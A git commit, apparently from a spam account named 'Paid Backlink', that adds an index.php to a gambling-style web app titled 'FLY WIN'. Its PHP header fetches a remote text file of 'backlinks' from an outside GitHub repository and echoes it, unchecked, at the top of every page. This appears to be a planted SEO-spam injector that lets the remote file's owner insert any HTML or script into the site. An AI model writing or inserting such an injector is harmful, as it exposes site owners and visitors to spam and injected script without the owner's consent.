c4bda2e1ff522c5741188ec76347531492050487
Paid Backlink <152395041+BacklinkGG@users.noreply.github.com>
2023-12-01 11:05:52 +0800

    Create index.php

---
+++ index.php
@@ -0,0 +1,24 @@
+<?php
+// By Mr7Mind
+$url = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$result = curl_exec($ch);
+curl_close($ch);
+echo $result;
+?>
+<!doctype html><html lang=""><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" href="/favicon.ico"><title>FLY WIN</title><script defer="defer" src="/js/chunk-vendors.80e769af.js"></script><script defer="defer" src="/js/app.3a67099c.js"></script>
+<script>
+// document.addEventListener("visibilitychange", function() {
+//   if (document.hidden){
+//       console.log("Browser tab is hidden")
+//   } else {
+//       console.log("Browser tab is visible")
+//       location.reload();
+//   }
+// });
+</script>
+
+
+
+<link href="/css/app.6bc18ed2.css" rel="stylesheet"></head><body><noscript><strong>We're sorry but Fly win doesn't work properly without JavaScript enabled. Please enable it to continue.</strong></noscript><div id="app"></div></body></html>
